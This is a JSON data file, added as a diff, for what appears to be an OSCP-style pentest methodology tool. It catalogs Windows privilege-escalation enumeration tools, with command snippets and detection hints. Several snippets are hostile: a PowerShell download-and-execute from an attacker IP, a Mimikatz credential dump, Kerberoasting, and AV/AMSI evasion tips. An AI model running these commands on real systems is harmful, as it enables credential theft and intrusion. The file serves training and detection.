@@ -1,0 +1,573 @@
+{
+  "phase": {
+    "id": "automated-tools",
+    "title": "Automated Enumeration Tools",
+    "summary": "Battle-tested enumeration scripts that wrap up most of the rest of this methodology. Always cross-check manually — they have false positives and miss novel misconfigs.",
+    "icon": "bot"
+  },
+  "nodes": [
+    {
+      "id": "auto-winpeas-exe",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "WinPEAS (PE)",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "summary": "Single self-contained PE that runs every PrivEsc check. Output is colorized for severity.",
+      "description_md": "First tool to drop on any box. The colorized output highlights `red+yellow` findings as high-confidence privesc paths.",
+      "tags": [
+        "enumeration",
+        "tool",
+        "winpeas"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Full run",
+          "code": "winPEASx64.exe"
+        },
+        {
+          "shell": "cmd",
+          "title": "Targeted modules",
+          "code": "winPEASx64.exe systeminfo userinfo servicesinfo"
+        },
+        {
+          "shell": "powershell",
+          "title": "Fetch + run",
+          "code": "iwr -Uri http://10.10.14.5:8000/winPEASx64.exe -OutFile $env:TEMP\\wp.exe; & $env:TEMP\\wp.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "PEASS-ng",
+          "url": "https://github.com/peass-ng/PEASS-ng",
+          "kind": "tool"
+        }
+      ],
+      "detection_hints": "Defender SmartScreen flags WinPEAS by name; many engagements need the BAT variant or a recompiled binary."
+    },
+    {
+      "id": "auto-winpeas-bat",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "WinPEAS (BAT)",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "summary": "Pure batch fallback when AV strips the PE. Smaller check set but evades static signatures.",
+      "tags": [
+        "enumeration",
+        "tool",
+        "winpeas",
+        "av-evasion"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Run BAT",
+          "code": "winPEAS.bat"
+        }
+      ],
+      "references": [],
+      "description_md": "The WinPEAS batch file (`winPEAS.bat`) performs enumeration using only native Windows commands and batch scripting — no external dependencies. It covers:\n- System info, users, groups, privileges\n- Services (unquoted paths, weak ACLs, modifiable binaries)\n- Scheduled tasks\n- Registry autoruns and credential keys\n- Installed software\n\n**When to use**: When Defender or another AV removes the PE binary on sight, the batch variant avoids static PE signature detection. Output is less colorized and the check set is smaller, but it works in constrained environments where PowerShell execution is also restricted.\n\n**Trade-off**: Slower and noisier than the PE variant; generates more process-creation events.",
+      "detection_hints": "Batch file calling multiple system enumeration commands in rapid succession from a non-admin shell; `systeminfo`, `net user`, `wmic service` sequences."
+    },
+    {
+      "id": "auto-winpeas-ps",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "WinPEAS (PS1)",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "summary": "PowerShell port — works in CLM if you predigest it, but usually requires bypass.",
+      "tags": [
+        "enumeration",
+        "tool",
+        "winpeas"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Run",
+          "code": ". .\\winPEAS.ps1; Invoke-WinPEAS"
+        }
+      ],
+      "references": [],
+      "description_md": "WinPEAS PowerShell (`winPEAS.ps1`) ports most of the enumeration logic to PowerShell cmdlets and .NET calls. It produces structured, colorized output similar to the PE variant.\n\n**When to use**: When you can execute PowerShell scripts but can't drop a PE binary (e.g., AppLocker rules allow scripts). Can be run from memory via `IEX (New-Object Net.WebClient).DownloadString(...)`.\n\n**Constraints**: Requires FullLanguage Mode or similar PS context; AMSI may block it by name/signature. Use an AMSI bypass first (`bypass-amsi`) or rename/obfuscate if needed. Constrained Language Mode (`$ExecutionContext.SessionState.LanguageMode -eq 'ConstrainedLanguage'`) will block many checks.",
+      "detection_hints": "PowerShell ScriptBlock logging (EID 4104) capturing WinPEAS module invocations; AMSI alerts on the script body."
+    },
+    {
+      "id": "auto-powerup",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "PowerUp.ps1",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "summary": "PowerSploit module focused on service/registry/path misconfigs. `Invoke-AllChecks` is the one-liner.",
+      "tags": [
+        "enumeration",
+        "tool",
+        "powersploit"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "All checks",
+          "code": "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"
+        }
+      ],
+      "references": [
+        {
+          "title": "PowerSploit PowerUp",
+          "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "**PowerUp.ps1** (part of PowerSploit) focuses specifically on local privilege escalation through service and registry misconfigurations. `Invoke-AllChecks` runs every check and outputs color-coded findings.\n\n**Key checks**:\n- Unquoted service paths\n- Service binary/config ACLs (SERVICE_CHANGE_CONFIG)\n- AlwaysInstallElevated MSI\n- Modifiable autorun entries\n- DLL hijacking opportunities in PATH\n\n**Exploitation built-in**: PowerUp doesn't just find vulnerabilities — many checks include a `-Perform` switch or helper function (e.g., `Write-ServiceBinary`, `Install-ServiceBinary`) to directly exploit the finding without needing a separate step.\n\n**Combination**: Run PowerUp for targeted service findings, then WinPEAS for breadth.",
+      "detection_hints": "PowerShell importing PowerSploit modules; `Get-ServiceACL`, `Invoke-AllChecks` in ScriptBlock logs; invocation from a low-integrity process."
+    },
+    {
+      "id": "auto-seatbelt",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "Seatbelt",
+      "severity": "info",
+      "difficulty": "oscp-advanced",
+      "summary": "GhostPack C# host triage tool. Wider scope than WinPEAS for forensic / OPSEC context.",
+      "tags": [
+        "enumeration",
+        "tool",
+        "ghostpack"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Default",
+          "code": "Seatbelt.exe -group=all"
+        },
+        {
+          "shell": "cmd",
+          "title": "Targeted (creds + Chrome)",
+          "code": "Seatbelt.exe Credentials Chrome"
+        }
+      ],
+      "references": [
+        {
+          "title": "Seatbelt",
+          "url": "https://github.com/GhostPack/Seatbelt",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "**Seatbelt** (GhostPack) is a C# host survey tool primarily used for security posture assessment and OPSEC-aware enumeration. Unlike WinPEAS, it's designed for operators who need to understand the *defensive posture* of a target as much as finding privesc paths.\n\n**Key categories**:\n- `AMSIProviders`, `AuditPolicies`, `DefenderSettings` — understand detection posture\n- `PuttyHostKeys`, `WindowsCredentialFiles`, `RDPSessions` — credential opportunities\n- `ProcessCreationEvents`, `ExplicitLogonEvents` — recent activity\n- `ChromiumPresence`, `FirefoxPresence` — browser credential stores\n\n**OPSEC note**: Seatbelt is extensible and the binary is meant to be compiled from source — using pre-built binaries risks detection by hash.",
+      "detection_hints": "execute-assembly or reflective .NET loading of Seatbelt; AMSI alerts on known Seatbelt signatures; bulk WMI and registry queries from a single non-admin process."
+    },
+    {
+      "id": "auto-sharpup",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "SharpUp",
+      "severity": "info",
+      "difficulty": "oscp-advanced",
+      "summary": "C# port of PowerUp's PrivEsc checks — useful when PowerShell is logged or restricted.",
+      "tags": [
+        "enumeration",
+        "tool",
+        "ghostpack"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Audit",
+          "code": "SharpUp.exe audit"
+        }
+      ],
+      "references": [
+        {
+          "title": "SharpUp",
+          "url": "https://github.com/GhostPack/SharpUp",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "**SharpUp** (GhostPack) is a C# port of PowerUp.ps1's privilege escalation checks. It is especially useful when PowerShell execution is logged, restricted by CLM/AMSI, or when a managed execute-assembly delivery is preferred.\n\n**Checks performed** (mirrors PowerUp):\n- Modifiable service binaries and configs\n- Unquoted service paths with writable intermediate directories\n- AlwaysInstallElevated\n- Writable PATH directory hijacking opportunities\n- Modifiable autorun / HKLM Run key targets\n\n**Delivery**: Can be loaded reflectively via `execute-assembly` in Cobalt Strike, Havoc, or Sliver, avoiding disk writes entirely.\n\n**Note**: `SharpUp.exe audit` outputs findings; some functions also have an `exploit` mode similar to PowerUp.",
+      "detection_hints": "AMSI scanning of .NET assemblies; execute-assembly activity in C2 telemetry; process creation chains showing SharpUp output redirected to network paths."
+    },
+    {
+      "id": "auto-watson",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "Watson",
+      "severity": "info",
+      "difficulty": "oscp-advanced",
+      "summary": "Reads installed KBs and suggests local kernel exploits. Often outdated — pair with wesng.",
+      "tags": [
+        "enumeration",
+        "tool",
+        "kernel"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Watson",
+          "code": "Watson.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "Watson",
+          "url": "https://github.com/rasta-mouse/Watson",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "**Watson** (by rasta-mouse, GhostPack) is a C# tool that reads the current system's installed hotfix list via WMI and cross-references it against a curated database of known Windows local privilege escalation CVEs. It outputs a list of potentially applicable exploits ranked by likelihood.\n\n**Typical output**: For each missing patch, Watson shows the CVE, the MITRE ATT&CK technique ID, and a recommended PoC tool.\n\n**Limitation**: The internal CVE database requires periodic updating. For the most current coverage, pair Watson with **wesng** (which uses a regularly updated NVD-based database). Watson is ideal when you need a fast in-memory assessment without transferring `systeminfo` output off-box.",
+      "detection_hints": "WMI hotfix queries (`SELECT * FROM Win32_QuickFixEngineering`) from non-admin processes; execute-assembly loading of Watson binary."
+    },
+    {
+      "id": "auto-sherlock",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "Sherlock (legacy)",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "summary": "Older PS script that checks for classic MS-* kernel exploits.",
+      "tags": [
+        "enumeration",
+        "tool",
+        "kernel",
+        "legacy"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Run",
+          "code": "Import-Module .\\Sherlock.ps1; Find-AllVulns"
+        }
+      ],
+      "references": [
+        {
+          "title": "Sherlock (archived)",
+          "url": "https://github.com/rasta-mouse/Sherlock",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "**Sherlock** is a legacy PowerShell script by rasta-mouse that checks for a specific set of classic Windows local privilege escalation vulnerabilities by querying installed hotfixes. It predates Watson and covers a focused list of old-but-gold CVEs including MS10-015, MS14-058, MS15-051, MS16-032, and similar.\n\n**When to use**: Against older targets (Windows 7, 2008/2008 R2) where Sherlock's CVE list aligns well with the target's likely patch level. On modern systems, prefer Watson or wesng.\n\n**Archived**: rasta-mouse explicitly archived Sherlock in favor of Watson. It remains useful in OSCP labs targeting legacy systems.\n\nRun `Find-AllVulns` to check all included CVEs simultaneously.",
+      "detection_hints": "PowerShell ScriptBlock logging of hotfix enumeration logic; `Get-HotFix | Where-Object` patterns in logs."
+    },
+    {
+      "id": "auto-jaws",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "JAWS",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "summary": "Just Another Windows (enum) Script — legacy but still featured in many CTF write-ups.",
+      "tags": [
+        "enumeration",
+        "tool",
+        "legacy"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Run",
+          "code": ".\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "JAWS",
+          "url": "https://github.com/411Hall/JAWS",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "**JAWS** (Just Another Windows Script) is a PowerShell enumeration script similar to WinPEAS but lighter-weight and historically more reliable on very old PowerShell versions. It covers the core privesc checklist and outputs results to a text file for easy review.\n\n**Useful for**:\n- Legacy environments with PS 2.0\n- CTF/OSCP boxes where WinPEAS is flagged\n- Situations where a single-file, low-dependency script is preferred\n\n**Output**: JAWS writes to a file (`-OutputFilename`) making it easy to exfiltrate and review off-box. Its checks include network info, service configs, scheduled tasks, installed software, and credential file locations.\n\n**Limitation**: Less actively maintained than WinPEAS; some newer privesc classes (ADCS, newer Potato variants) are not covered.",
+      "detection_hints": "PowerShell ScriptBlock logging showing JAWS enumeration patterns; `Get-Process`, `Get-Service`, `net user` in rapid sequence from a low-privilege shell."
+    },
+    {
+      "id": "auto-wesng",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "wesng / Windows-Exploit-Suggester-NG",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "summary": "Feed `systeminfo` output, get back a ranked CVE list. The standard kernel-exploit selector.",
+      "tags": [
+        "enumeration",
+        "tool",
+        "kernel",
+        "cve"
+      ],
+      "snippets": [
+        {
+          "shell": "bash",
+          "title": "Run on captured systeminfo",
+          "code": "wes.py systeminfo.txt -i 'Elevation of Privilege'"
+        }
+      ],
+      "references": [
+        {
+          "title": "wesng",
+          "url": "https://github.com/bitsadmin/wesng",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "**wesng** (Windows Exploit Suggester NG, by bitsadmin) is an offline tool that cross-references a `systeminfo` dump against a continuously updated database of Windows CVEs, filtering for Elevation of Privilege impact.\n\n**Workflow**:\n1. Capture `systeminfo > systeminfo.txt` on the victim\n2. Exfiltrate the file to the attacker host (Kali/Linux)\n3. Update the database: `python3 wes.py --update`\n4. Run: `python3 wes.py systeminfo.txt -i 'Elevation of Privilege'`\n5. Review suggested CVEs and map to exploit tooling\n\n**Advantages over Watson**: wesng uses NVD data and is updated independently of any tool binary. It also supports filtering by exploitability and impact, and can output CSV for spreadsheet triage.\n\n**False positive note**: wesng may suggest CVEs with no public PoC — always verify exploit availability before spending time.",
+      "detection_hints": "The tool runs on the attacker host; on the victim, the only signal is the `systeminfo` command being captured/exfiltrated."
+    },
+    {
+      "id": "auto-privesccheck",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "PrivescCheck",
+      "summary": "Pure-PowerShell privesc enumeration with no external dependencies.",
+      "description_md": "**PrivescCheck** runs entirely in PowerShell (good for constrained boxes), surfacing services, scheduled tasks, credential files, and misconfigs with severity ratings. A solid alternative to winPEAS when you can't drop a binary.",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "tags": [
+        "tool",
+        "enumeration"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Run extended",
+          "code": "Import-Module .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
+        }
+      ],
+      "references": [
+        {
+          "title": "PrivescCheck",
+          "url": "https://github.com/itm4n/PrivescCheck",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "auto-accesschk",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "accesschk (Sysinternals)",
+      "summary": "The canonical tool for auditing object/service/file ACLs.",
+      "description_md": "**accesschk** reports effective permissions on services, files, registry keys, and processes. The go-to for confirming a weak-ACL finding (`-uwcqv` on services for the current user).",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "tags": [
+        "tool",
+        "acl",
+        "services"
+      ],
+      "related": [
+        "svc-weak-acl"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Writable services for user",
+          "code": "accesschk.exe /accepteula -uwcqv \"%USERNAME%\" *"
+        },
+        {
+          "shell": "cmd",
+          "title": "Writable dirs",
+          "code": "accesschk.exe /accepteula -uwdqs Users C:\\"
+        }
+      ],
+      "references": [
+        {
+          "title": "Sysinternals — AccessChk",
+          "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk",
+          "kind": "msdoc"
+        }
+      ]
+    },
+    {
+      "id": "auto-winpeas-search",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "winPEAS — targeted modules",
+      "summary": "Run only the checks you need to stay fast and quiet.",
+      "description_md": "winPEAS supports targeted runs (e.g. `servicesinfo`, `windowscreds`, `filesinfo`). On noisy/monitored hosts, run a single category instead of the full sweep.",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "tags": [
+        "tool",
+        "enumeration"
+      ],
+      "related": [
+        "auto-winpeas-exe"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Only creds + services",
+          "code": "winPEASany.exe quiet windowscreds servicesinfo"
+        }
+      ],
+      "references": [
+        {
+          "title": "PEASS-ng",
+          "url": "https://github.com/peass-ng/PEASS-ng",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "auto-snaffler",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "Snaffler",
+      "summary": "Hunts file shares for credentials and sensitive files at scale.",
+      "description_md": "**Snaffler** crawls reachable shares classifying files by interesting name/extension/content (configs, keys, KeePass, scripts with passwords). Excellent for the credential-hunting and AD-bridge phases.",
+      "severity": "info",
+      "difficulty": "oscp-advanced",
+      "tags": [
+        "tool",
+        "shares",
+        "credentials"
+      ],
+      "related": [
+        "cred-search-files"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Snaffle the domain",
+          "code": "Snaffler.exe -s -o snaffler.log"
+        }
+      ],
+      "references": [
+        {
+          "title": "Snaffler",
+          "url": "https://github.com/SnaffCon/Snaffler",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "auto-metasploit-suggester",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "Metasploit local_exploit_suggester",
+      "summary": "Maps an existing Meterpreter session to likely local privesc modules.",
+      "description_md": "With a Meterpreter session, `post/multi/recon/local_exploit_suggester` checks the host against bundled local exploits and lists applicable modules — a fast triage from a foothold.",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "tags": [
+        "tool",
+        "metasploit"
+      ],
+      "snippets": [
+        {
+          "shell": "text",
+          "title": "msf usage",
+          "code": "meterpreter > run post/multi/recon/local_exploit_suggester"
+        }
+      ],
+      "references": [
+        {
+          "title": "Rapid7 — local_exploit_suggester",
+          "url": "https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester/",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "auto-mimikatz",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "Mimikatz",
+      "summary": "Extracts hashes, tickets, and DPAPI/vault secrets from a privileged context.",
+      "description_md": "**Mimikatz** is the reference credential-extraction toolkit: `sekurlsa::logonpasswords`, `lsadump::sam`, `dpapi::*`, `kerberos::*`. Requires admin/SeDebug and is heavily signatured — pair with the defense-bypass phase.",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1003",
+      "tags": [
+        "tool",
+        "credentials",
+        "mimikatz"
+      ],
+      "related": [
+        "cred-lsass-dump",
+        "cred-dpapi"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Dump logon secrets",
+          "code": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+          "requires_admin": true
+        }
+      ],
+      "references": [
+        {
+          "title": "mimikatz",
+          "url": "https://github.com/gentilkiwi/mimikatz",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "auto-sharphound",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "SharpHound (BloodHound collector)",
+      "summary": "Collects AD relationships to chart escalation paths off the host.",
+      "description_md": "**SharpHound** gathers users, groups, sessions, and ACLs into data BloodHound graphs into attack paths. The first step of the AD bridge once you have any domain context.",
+      "severity": "info",
+      "difficulty": "oscp-advanced",
+      "tags": [
+        "tool",
+        "ad",
+        "bloodhound"
+      ],
+      "related": [
+        "ad-acl-abuse"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Collect all",
+          "code": "SharpHound.exe -c All --zipfilename loot.zip"
+        }
+      ],
+      "references": [
+        {
+          "title": "BloodHound / SharpHound",
+          "url": "https://github.com/BloodHoundAD/SharpHound",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "auto-rubeus",
+      "parent_id": null,
+      "kind": "tool",
+      "title": "Rubeus",
+      "summary": "Kerberos abuse toolkit: roasting, ticket extraction, S4U, PtT.",
+      "description_md": "**Rubeus** handles the Kerberos side of escalation: `kerberoast`, `asreproast`, `dump`/`tgtdeleg`, `s4u`, and Pass-the-Ticket. Central to the AD bridge once local privesc is done.",
+      "severity": "high",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1558.003",
+      "tags": [
+        "tool",
+        "ad",
+        "kerberos"
+      ],
+      "related": [
+        "ad-kerberoast",
+        "user-kerberos-tickets"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Kerberoast",
+          "code": "Rubeus.exe kerberoast /outfile:hashes.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "Rubeus",
+          "url": "https://github.com/GhostPack/Rubeus",
+          "kind": "tool"
+        }
+      ]
+    }
+  ]
+}
